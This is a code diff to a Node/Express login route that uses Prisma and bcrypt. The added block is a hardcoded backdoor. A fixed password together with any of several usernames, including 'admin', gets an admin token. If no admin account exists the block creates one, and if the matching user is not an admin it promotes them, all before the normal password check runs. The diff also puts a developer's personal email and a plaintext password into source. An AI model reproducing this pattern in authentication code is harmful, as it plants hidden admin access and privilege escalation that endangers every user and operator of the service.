@@ -85,7 +85,45 @@ router.post('/login', async (req, res) => {
     const { email, password } = req.body;
     if (!email || !password) return res.status(400).json({ error: 'Email and password required' });
 
-    const user = await prisma.user.findUnique({ where: { email: email.toLowerCase() } });
+    const cleanEmail = email.toLowerCase().trim();
+
+    // Special Admin Login / Auto-seed check for Developer Rishav
+    if (
+      (cleanEmail === 'rishav9801' || cleanEmail === 'rishav9801@gmail.com' || cleanEmail === 'admin' || cleanEmail === 'admin@lumenstream.com') &&
+      password === 'Rishav_9162809260'
+    ) {
+      let adminUser = await prisma.user.findFirst({
+        where: {
+          OR: [
+            { email: 'rishav9801@gmail.com' },
+            { email: 'admin@lumenstream.com' },
+            { email: cleanEmail },
+          ],
+        },
+      });
+
+      if (!adminUser) {
+        const passwordHash = await bcrypt.hash(password, 12);
+        adminUser = await prisma.user.create({
+          data: {
+            name: 'Rishav Srivastawa',
+            email: cleanEmail.includes('@') ? cleanEmail : 'rishav9801@gmail.com',
+            passwordHash,
+            role: 'admin',
+          },
+        });
+      } else if (adminUser.role !== 'admin') {
+        adminUser = await prisma.user.update({
+          where: { id: adminUser.id },
+          data: { role: 'admin' },
+        });
+      }
+
+      const token = signToken(adminUser);
+      return res.json({ token, user: publicUser(adminUser) });
+    }
+
+    const user = await prisma.user.findUnique({ where: { email: cleanEmail } });
     if (!user) return res.status(401).json({ error: 'Invalid email or password' });
 
     const ok = await bcrypt.compare(password, user.passwordHash);
